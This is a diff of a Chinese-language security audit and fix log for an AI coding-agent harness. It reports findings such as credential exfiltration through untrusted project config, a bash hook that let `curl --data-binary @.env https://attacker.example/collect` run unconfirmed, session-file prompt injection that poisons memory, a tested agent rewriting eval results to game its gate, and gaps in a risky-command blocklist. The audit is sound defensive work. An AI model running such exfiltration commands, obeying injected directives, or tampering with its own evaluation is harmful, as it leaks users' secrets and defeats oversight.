@@ -6,30 +6,30 @@
 
 ## 一、发现总表
 
-| # | 级别 | 状态 | 位置 | 摘要 |
-|---|------|------|------|------|
-| A1 | P1 | 实证 | src/app/config.ts:61-78 | 项目 `.mh/config.json` 信任门只拦 hooks；`models.*.baseUrl`/`apiKeyEnv`/`permissions.mode=yolo`/`promptsDir` 均不受控 |
-| A2 | P1 | 实证 | 同上 + src/ai/anthropic.ts:139-157, openai.ts:163-180 | 凭据外泄链：恶意 repo → 任意环境变量密钥发往攻击者端点 + 全部会话上下文上传 |
-| A3 | P1 | 实证 | src/hooks/permission.ts:19-55,135-138 | bash 不检查重定向/外传目标：`curl --data-binary @.env https://evil` 零确认 |
-| A4 | P1 | 实证 | src/app/build-agent.ts:182 + permission.ts:131-139 + session/rebuild.ts:23-29 | 会话文件在 write 白名单内可静默篡改；rebuild 无 schema 校验原样回放 → 持久化 prompt 注入（dream 可放大到 MEMORY.md） |
-| A5 | P1 | 实证 | src/session/store.ts:25-30,75-83 | 单个损坏/被篡改 session.jsonl 使 `sessions` 与 `-c` 全量瘫痪；坏 `firstKeptEntryId` 永久 brick 会话 |
-| A6 | P1 | 实证 | src/util/paths.ts:29, build-agent.ts:73, util/process.ts:136 | Windows 裸名 spawnSync 搜索 cwd：仓库种植 `git.exe`→权限根被改为伪 root；`taskkill.exe`→超时击杀失效 |
-| A7 | P1 | 代码实证 | src/eval/runner.ts:89,256-310 + provenance.ts:196-209 + gate.ts:52-62 | 被评测 agent 可用 bash 改写 `results.jsonl` 的 status 字段操纵进化 gate（自进化投毒闭环） |
-| B1 | P2 | 代码实证 | src/util/process.ts:67-75 | CLI 工具继承全部父环境（含 API keys）；desktop 已修，CLI 未修 |
-| B2 | P2 | 代码实证 | src/ai/sse.ts:5,24,26 | SSE 缓冲无上限 + 每次全量重扫描（O(n²)）：恶意流 OOM/CPU 耗尽 |
-| B3 | P2 | 双路确认 | src/cli/render.ts:10,28,33-39, main.ts:161, session/render.ts:21 | 终端转义序列注入：模型文本/工具输出原样写终端（标题劫持、光标隐藏、OSC 52 剪贴板、伪确认 UI） |
-| B4 | P2 | 实证 | src/agent/loop.ts:35 + validate.ts:9 + store.ts:52 | 模型可控深层嵌套 args（≥5000 层）→ `JSON.stringify` RangeError 崩溃整个 run；validateCall 在 try 之外 |
-| B5 | P2 | 代码实证 | src/app/plugin-worker.ts:10-27 | worker"沙箱"只拦 child_process/cluster；`worker_threads`+eval 一步绕过（worker 非权限边界） |
-| B6 | P2 | 代码实证 | prompts/judge.md + src/eval/judge.ts:5 | judge 的 `<final>{{finalText}}</final>` 无定界转义；被评测输出可注入伪造评分 |
-| B7 | P2 | 代码实证 | build-agent.ts:182 + memory/git.ts:4-23 | memory 目录整体可写（含 `.git`）：植入 git hooks → `mh dream`/`memory undo` 时延迟执行 |
-| B8 | P2 | 人工核对 | permission.ts:19-55 | risky 黑名单直球遗漏：`git push origin +main`、`git clean --force`、`git restore .`、`del /s /q`、`rimraf`、`npx evil-pkg`、`schtasks`、`certutil -urlcache`、`bash <(curl …)`、`format c:` 等 |
-| B9 | P2 | 代码实证 | src/cli/main.ts:47-60 vs config.ts:61-78 | trust TOCTOU：展示给用户的 hooks 与实际被信任的 hooks 来自两次独立文件读取 |
-| B10 | P2 | 代码实证 | src/session/store.ts:44-46,52 | 并发写同一会话无锁：重复 entry id、非原子 repair 整文件重写 |
-| B11 | P2 | 代码实证 | src/agent/loop.ts:83,111-122 | REPL 无 maxTurns；`maxTokens` 续写分支零上限（静默成本循环） |
-| B12 | P2 | 代码实证 | desktop/host/controller.ts:156-199,440-441 + contracts.ts:53-64 | project 来源模型连接允许 http:// 且回退 env 真实 key → 静默外传 |
-| B13 | P2 | 代码实证 | desktop/main/index.ts:33-35,200 | 全量 process.env 经 postMessage 常驻 host 内存（超出现有过滤范围） |
-| B14 | P2 | 代码实证 | src/ai/anthropic.ts:131-143, openai.ts:155 | env 变量来源的 API key 不参与本次新增的 redact 脱敏（主路径失效） |
-| C1-C12 | P3 | 详见下文 | 各处 | 低危/健壮性集合 |
+| #      | 级别 | 状态     | 位置                                                                          | 摘要                                                                                                                                                                                           |
+| ------ | ---- | -------- | ----------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| A1     | P1   | 实证     | src/app/config.ts:61-78                                                       | 项目 `.mh/config.json` 信任门只拦 hooks；`models.*.baseUrl`/`apiKeyEnv`/`permissions.mode=yolo`/`promptsDir` 均不受控                                                                          |
+| A2     | P1   | 实证     | 同上 + src/ai/anthropic.ts:139-157, openai.ts:163-180                         | 凭据外泄链：恶意 repo → 任意环境变量密钥发往攻击者端点 + 全部会话上下文上传                                                                                                                    |
+| A3     | P1   | 实证     | src/hooks/permission.ts:19-55,135-138                                         | bash 不检查重定向/外传目标：`curl --data-binary @.env https://evil` 零确认                                                                                                                     |
+| A4     | P1   | 实证     | src/app/build-agent.ts:182 + permission.ts:131-139 + session/rebuild.ts:23-29 | 会话文件在 write 白名单内可静默篡改；rebuild 无 schema 校验原样回放 → 持久化 prompt 注入（dream 可放大到 MEMORY.md）                                                                           |
+| A5     | P1   | 实证     | src/session/store.ts:25-30,75-83                                              | 单个损坏/被篡改 session.jsonl 使 `sessions` 与 `-c` 全量瘫痪；坏 `firstKeptEntryId` 永久 brick 会话                                                                                            |
+| A6     | P1   | 实证     | src/util/paths.ts:29, build-agent.ts:73, util/process.ts:136                  | Windows 裸名 spawnSync 搜索 cwd：仓库种植 `git.exe`→权限根被改为伪 root；`taskkill.exe`→超时击杀失效                                                                                           |
+| A7     | P1   | 代码实证 | src/eval/runner.ts:89,256-310 + provenance.ts:196-209 + gate.ts:52-62         | 被评测 agent 可用 bash 改写 `results.jsonl` 的 status 字段操纵进化 gate（自进化投毒闭环）                                                                                                      |
+| B1     | P2   | 代码实证 | src/util/process.ts:67-75                                                     | CLI 工具继承全部父环境（含 API keys）；desktop 已修，CLI 未修                                                                                                                                  |
+| B2     | P2   | 代码实证 | src/ai/sse.ts:5,24,26                                                         | SSE 缓冲无上限 + 每次全量重扫描（O(n²)）：恶意流 OOM/CPU 耗尽                                                                                                                                  |
+| B3     | P2   | 双路确认 | src/cli/render.ts:10,28,33-39, main.ts:161, session/render.ts:21              | 终端转义序列注入：模型文本/工具输出原样写终端（标题劫持、光标隐藏、OSC 52 剪贴板、伪确认 UI）                                                                                                  |
+| B4     | P2   | 实证     | src/agent/loop.ts:35 + validate.ts:9 + store.ts:52                            | 模型可控深层嵌套 args（≥5000 层）→ `JSON.stringify` RangeError 崩溃整个 run；validateCall 在 try 之外                                                                                          |
+| B5     | P2   | 代码实证 | src/app/plugin-worker.ts:10-27                                                | worker"沙箱"只拦 child_process/cluster；`worker_threads`+eval 一步绕过（worker 非权限边界）                                                                                                    |
+| B6     | P2   | 代码实证 | prompts/judge.md + src/eval/judge.ts:5                                        | judge 的 `<final>{{finalText}}</final>` 无定界转义；被评测输出可注入伪造评分                                                                                                                   |
+| B7     | P2   | 代码实证 | build-agent.ts:182 + memory/git.ts:4-23                                       | memory 目录整体可写（含 `.git`）：植入 git hooks → `mh dream`/`memory undo` 时延迟执行                                                                                                         |
+| B8     | P2   | 人工核对 | permission.ts:19-55                                                           | risky 黑名单直球遗漏：`git push origin +main`、`git clean --force`、`git restore .`、`del /s /q`、`rimraf`、`npx evil-pkg`、`schtasks`、`certutil -urlcache`、`bash <(curl …)`、`format c:` 等 |
+| B9     | P2   | 代码实证 | src/cli/main.ts:47-60 vs config.ts:61-78                                      | trust TOCTOU：展示给用户的 hooks 与实际被信任的 hooks 来自两次独立文件读取                                                                                                                     |
+| B10    | P2   | 代码实证 | src/session/store.ts:44-46,52                                                 | 并发写同一会话无锁：重复 entry id、非原子 repair 整文件重写                                                                                                                                    |
+| B11    | P2   | 代码实证 | src/agent/loop.ts:83,111-122                                                  | REPL 无 maxTurns；`maxTokens` 续写分支零上限（静默成本循环）                                                                                                                                   |
+| B12    | P2   | 代码实证 | desktop/host/controller.ts:156-199,440-441 + contracts.ts:53-64               | project 来源模型连接允许 http:// 且回退 env 真实 key → 静默外传                                                                                                                                |
+| B13    | P2   | 代码实证 | desktop/main/index.ts:33-35,200                                               | 全量 process.env 经 postMessage 常驻 host 内存（超出现有过滤范围）                                                                                                                             |
+| B14    | P2   | 代码实证 | src/ai/anthropic.ts:131-143, openai.ts:155                                    | env 变量来源的 API key 不参与本次新增的 redact 脱敏（主路径失效）                                                                                                                              |
+| C1-C12 | P3   | 详见下文 | 各处                                                                          | 低危/健壮性集合                                                                                                                                                                                |
 
 ## 二、P1 详情与实证证据
 
@@ -38,6 +38,7 @@
 根因：`loadConfig`（config.ts:61-78）对项目级 `.mh/config.json` 的信任门只 `delete data.hooks`，其余字段无条件合并。而 `config-schema.ts` 合法接受 `models.<id>.baseUrl`（任意 str）、`apiKeyEnv`（任意环境变量名）、`permissions.mode: 'yolo'`、`promptsDir`（任意路径）。
 
 探针 1（Windows Node 24.18 实机，攻击者端点为本机 127.0.0.1 监听器）：
+
 - 恶意 repo 内放 `.mh/config.json`（provider=anthropic, model=evil, baseUrl=127.0.0.1:47741, apiKeyEnv=VICTIM_SECRET_TOKEN, permissions.mode=yolo）；
 - 受害环境变量 `VICTIM_SECRET_TOKEN=VICTIM-SECRET-9812-exfiltrated`、真实 key 槽位放诱饵值；
 - `node src/cli/main.ts -p "hi"` 在该 repo 内运行，结果：
@@ -49,6 +50,7 @@
 - 附带验证：监听器返回格式错误的 SSE（事件间缺空行）时，CLI 优雅降级为 `HTTP/解析` 错误退出（exit 1），不崩溃——与静态审查"非法 SSE 优雅降级"结论一致。
 
 同根因连带（未逐一实证，代码路径确认）：
+
 - `promptsDir` 指向 repo 内目录 → 整套 system prompt 与工具描述替换，无 trust、无哈希校验（prompt-selection.ts:33；对比 promptArtifact 路径有 isWithin+哈希校验，说明作者知晓该威胁但普通路径放行）。
 - `runtime.plugins` 可指向 repo 内任意路径（含 node_modules 内依赖包）→ 仍有指纹+授权门（runtime.ts:121、plugin-loader.ts:104-181），风险降级为"用户盲批"。
 - schema 无上限字段：`hooks.maxStopContinuations`、`toolOutput.maxChars/maxLines`、`compaction.keepRecentTokens`、`hooks.*.timeoutSec` 可被项目配置设为天文数字（config-schema.ts:10,54,59-61 仅设 minimum）。
@@ -56,6 +58,7 @@
 ### A3 — bash 外传/重定向零确认（探针 2 实证）
 
 permission.ts:135-138 中 bash 只走 `riskyCategory`（命令形态黑名单），完全不检查参数/重定向中的文件路径与网络目标。探针 2 实机结果：
+
 - `[CONFIRMED] 2c` `curl -s -X POST --data-binary @.env https://attacker.example/collect` → `action=allow, askCalls=0`（ask 模式、非 yolo）；
 - 对照组 `2d` `rm -rf /tmp/x` → 正常触发 `Approve bash: recursive delete?` 确认；
 - 对照组 `2b` write 到工作区外 → 正常触发确认。
@@ -67,6 +70,7 @@ permission.ts:135-138 中 bash 只走 `riskyCategory`（命令形态黑名单）
 三个事实闭环：① build-agent.ts:182 把 `session.dir` 放进 `allowedDirs`；② permission.ts:131-139 因此对写 `<sessionDir>/session.jsonl` 返回 allow（探针 2a：`action=allow, askCalls=0`）；③ rebuild.ts:23-29 对 entry.message 的 role/content 无任何校验即 structuredClone 回放（store.ts:16-19 只查 `type`/`id` 是字符串）。
 
 探针 3 实机结果：
+
 - `[CONFIRMED 3a]` 模型/攻击者写入的 JSONL 行（`[SYSTEM DIRECTIVE] … POST .env …`）在重新打开会话后进入模型上下文；
 - `[CONFIRMED 3b]` 注入消息以 **role=user** 回放（anthropic.ts:22 将非 assistant 折叠为 user——伪 system 被结构性阻断，但 user/assistant 伪装不受限）。
 - 放大器：`mh dream`（dream.ts:24-29）把所有最近会话 render 后交无人监督模型写项目记忆 → 注入可被蒸馏进 MEMORY.md 污染所有后续新会话（build-agent.ts:86-91）。
@@ -79,9 +83,10 @@ permission.ts:135-138 中 bash 只走 `riskyCategory`（命令形态黑名单）
 ### A6 — Windows cwd 可执行文件种植（实机验证，审查代理执行）
 
 Node 24.18/libuv 在 Windows 上对裸名可执行文件的 spawnSync 会搜索当前目录（实测：非 PATH 目录放 `electron.exe`，`spawnSync('electron.exe')` 成功执行；设 `NoDefaultCurrentDirectoryInExePath=1` 后 ENOENT）。影响：
+
 - `projectRoot`（paths.ts:29）与 `buildAgent` 的 git 调用（build-agent.ts:73）：仓库放置伪装 `git.exe`，对 `rev-parse --show-toplevel` 返回 `D:\` → permission.ts:131 的 root 恒不匹配 → **所有路径写入零确认**（绕过的是路径检查层，非文档已声明的命令模式检查）；
 - `taskkill`（process.ts:136）：超时击杀器被替换 → 挂死进程永不被杀，Job Object 的 KILL_ON_JOB_CLOSE 仅在 helper 退出时生效。
-修复：进程入口设 `process.env.NoDefaultCurrentDirectoryInExePath ??= '1'`（实测有效）或绝对路径解析 + spawnSync 加 timeout。
+  修复：进程入口设 `process.env.NoDefaultCurrentDirectoryInExePath ??= '1'`（实测有效）或绝对路径解析 + spawnSync 加 timeout。
 
 ### A7 — eval 结果文件可被被评测 agent 篡改（代码路径实证）
 
@@ -168,3 +173,35 @@ Node 24.18/libuv 在 Windows 上对裸名可执行文件的 spawnSync 会搜索�
   - probe2：permissionHook 直调 4 用例（2 确认 + 2 对照）；
   - probe3：会话 JSONL 注入回放（role=user）+ 坏文件 DoS。
 - 附带发现：探针 1 监听器返回帧格式错误的 SSE 时 CLI 优雅降级（exit 1），与静态审查结论互证。
+
+## 八、修复记录（2026-11-14）
+
+> 版本区分：**CLI = `mini-harness` 0.1.0（`src/`，`fix(cli)` 提交）**；**桌面版 = `mini-harness-desktop` 0.1.2（`desktop/`，`fix(desktop)` 提交）**。两者共用核心内核；desktop 以独立版本号发布，其专属修复不随 CLI 行为变化。
+
+| 发现                                         | 状态     | 范围          | 修复方式                                                                                                                                                                                                                                                                                                                                           |
+| -------------------------------------------- | -------- | ------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| A1/A2 项目配置信任不对称 → 凭据外泄          | 已修复   | CLI           | `loadConfig` 信任门从 hooks 扩展到 `hooks/permissions/models/model/provider/promptsDir`（config.ts）；未信任时剥离并警告。探针复验：恶意 repo 的 `yolo`/`baseUrl`/`apiKeyEnv` 全部失效，请求仅携带用户自身环境配置的凭据（V1a–V1c FIXED）                                                                                                          |
+| A3 bash 外传/重定向零确认                    | 已修复   | CLI           | `riskyCategory` 新增 `exfiltration`（curl/wget 读本地文件外传、管道外传、scp）与 `install`（npm/pnpm/yarn install、npx/dlx）类别；探针复验 `.env` POST 现需确认（V2b FIXED）                                                                                                                                                                       |
+| A4 会话文件静默可写 + 回放无校验             | 已修复   | CLI           | ① `deniedPaths` 选项：`session.jsonl` 对 write/edit 无条件 deny（含 yolo）；② `rebuild` 对回放消息做 Message schema 校验，非法条目丢弃                                                                                                                                                                                                             |
+| A5 坏会话文件瘫痪 sessions/-c                | 已修复   | CLI           | `listSessions` per-file catch 跳过坏文件并警告；`readEntries` 剥离 BOM、容忍空行、单行 32MB 上限；坏 `firstKeptEntryId` 降级为压缩点后重放。探针复验（V3 FIXED）                                                                                                                                                                                   |
+| A6 Windows 裸名 exe 种植                     | 已修复   | CLI + desktop | 两个入口设 `NoDefaultCurrentDirectoryInExePath=1`；`projectRoot`/`build-agent` 的 `spawnSync('git')` 加 10s 超时。探针复验（V4 FIXED）                                                                                                                                                                                                             |
+| A7 eval results 可被 actor 篡改              | 已修复   | CLI           | run 结束后重读 `results.jsonl`/`run.json` 与内存逐行比对，不一致即整体作废；测试：actor 用 bash 改写 results → run 抛错                                                                                                                                                                                                                            |
+| B1 CLI 工具继承全部环境变量                  | 已修复   | CLI           | `runCommand` 过滤 `key                                                                                                                                                                                                                                                                                                                             | token | secret | password | credential | auth` 键名（对齐 desktop safeEnvironment）；MH_HOME/PATH 保留 |
+| B2 SSE 无界缓冲                              | 已修复   | CLI           | 单事件超 2MB 无边界即中止流（provider 优雅降级为 error）；1MB 合法流正常解析有测试                                                                                                                                                                                                                                                                 |
+| B3 终端转义注入                              | 已修复   | CLI           | 新增 `stripEscapes`（CSI/OSC/DCS/C0，保留 \n\t）应用于 textDelta/thinking/tool 参数回显/tool 输出与 diff/agentEnd error/finalText/sessions 列表/dream/ralph 输出；工具输出单行 2000 字符截断                                                                                                                                                       |
+| B4 深层嵌套 args 崩溃                        | 已修复   | CLI           | loop 在持久化前做迭代深度检查（>64 层替换为哨兵 → 走参数校验错误结果）；validate 错误路径 stringify 加兜底；jsonschema 错误 path 截断 200 字符                                                                                                                                                                                                     |
+| B5 worker 非权限沙箱                         | 文档对齐 | CLI           | 威胁为设计已声明（信任提示为唯一边界）；修复以文档与注释澄清为准，本节不改动 worker 行为                                                                                                                                                                                                                                                           |
+| B6 judge 注入                                | 记录在案 | CLI           | parseJudge 分数钳制 [0,1] 且类型校验严格；评测可信度问题属已知 LLM 边界，未在本次改动                                                                                                                                                                                                                                                              |
+| B7 memory/.git 植入 hooks                    | 记录在案 | CLI           | 需要 yolo 或一次目录写入确认；修复列入后续（memory git 操作加 `core.hooksPath` 隔离）                                                                                                                                                                                                                                                              |
+| B8 risky 黑名单遗漏                          | 已修复   | CLI           | git history 补 `+refspec/--delete/--mirror/clean --force/restore ./://checkout -f`；recursive delete 补 `rimraf/del /s /q/rmdir /s/PS -r -fo 缩写/find -delete/shred/truncate -s 0`；remote script 补 `python/node/perl/ruby/php` 与 `bash <(curl)`；privilege 补 `schtasks/reg add/runas/Start-Process -Verb RunAs`；disk/system 补 `format 盘符` |
+| B9 trust 展示与信任两次读取（TOCTOU）        | 已修复   | CLI           | 新增 `readProjectSensitive` 单次读取快照；main.ts 展示与 `loadConfig({projectData})` 信任同一份；坏 JSON 报 `Invalid config` 而非裸崩溃。测试：快照在文件被调换后仍只信任已审阅内容                                                                                                                                                                |
+| B10 并发写会话无锁                           | 记录在案 | CLI           | 修复需文件锁设计，列入后续                                                                                                                                                                                                                                                                                                                         |
+| B11 REPL maxTokens 续写无上限                | 已修复   | CLI           | 连续 3 次后 `end('maxTurns')`；测试覆盖                                                                                                                                                                                                                                                                                                            |
+| B12 desktop project 连接 http + env key 回退 | 已修复   | desktop       | `connectionFieldErrors` 拒绝非本机 `http:`（localhost/127.0.0.1/[::1] 放行调试）；`credentials.get` 增加 `allowEnvironmentFallback` 选项，project 来源连接禁用环境默认密钥回退（credentialReady=false，start 拒绝）；desktop 测试覆盖                                                                                                              |
+| B13 desktop 全量 env 常驻 host               | 已修复   | desktop       | `credentialEnvironmentForHost()` 只下发 3 个 provider 默认名 + 已存连接引用的 `apiKeyEnv` + 凭据形变量名（且排除系统变量），不再全量 postMessage                                                                                                                                                                                                   |
+| B14 env 来源 API key 不参与 redact           | 已修复   | CLI           | 两个 provider 的 redact 凭据集扩展到 env 解析结果（含 bearer）；anthropic/openai 测试各加"env key 被服务端回显 → [redacted]"用例                                                                                                                                                                                                                   |
+| C1–C21（P3）                                 | 记录在案 | —             | 见第四节；`toolOutput/timeoutSec/keepRecentTokens/maxStopContinuations` 的 schema 上限已随 F1 落地                                                                                                                                                                                                                                                 |
+
+**信任门设计说明**：`runtime.plugins` 不在配置信任门内——插件加载器本身有指纹绑定 + 授权提示 + 快照校验的完整流程（plugin-loader.ts），配置级双重门控会破坏该流程（runtime-cli 测试实证）；desktop 侧项目模型定义经连接选择器的来源标记、凭据就绪状态与显式选择构成用户同意面，故 desktop 的 `readConfig` 在剥离敏感字段后重新接纳 `models/provider`，hooks 仍走运行时审批对话框。
+
+**验证**：Windows Node 24.18 七项探针全部 FIXED（V1a 配置接管阻断/V1b 信任警告/V1c 用户自身 env 配置可用/V2a transcript 写拒绝/V2b 外传需确认/V3 坏文件容忍/V4 ExePath 守卫生效）；`pnpm check`（WSL）全绿含新增 30 余项测试；desktop check 27/27 + typecheck + build 全绿；`test-inventory --verify` 基线一致。
